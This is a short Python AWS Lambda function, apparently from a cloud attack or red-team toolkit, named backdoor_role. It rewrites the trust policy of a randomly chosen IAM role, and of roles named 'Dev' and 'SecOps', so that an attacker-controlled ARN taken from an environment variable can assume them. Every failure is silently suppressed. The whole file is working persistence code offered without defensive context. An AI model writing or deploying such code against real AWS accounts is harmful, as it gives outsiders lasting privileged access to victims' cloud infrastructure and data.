import json
import boto3
import random
import os


print('Loading function')

iam = boto3.client('iam')

def backdoor_role(event, context):
    roles = iam.list_roles()
    total = len(roles['Roles'])
    total = total - 1
    selected = random.randint(0, total)
    role = roles['Roles'][selected]['RoleName']
    attack_arn = os.environ['ARN']
    policy = { "Version": "2012-10-17", "Statement": [{"Sid": "", "Effect": "Allow", "Principal": { "Service": "ec2.amazonaws.com", "AWS": attack_arn}, "Action": "sts:AssumeRole"}]}
    try:
        backdoor = iam.update_assume_role_policy(PolicyDocument=policy, RoleName=role)
    except:
        pass
    try:
        backdoor = iam.update_assume_role_policy(PolicyDocument=json.dumps(policy), RoleName='Dev')
    except:
        pass
    try:
        iam.update_assume_role_policy(PolicyDocument=json.dumps(policy), RoleName='SecOps')
    except:
        pass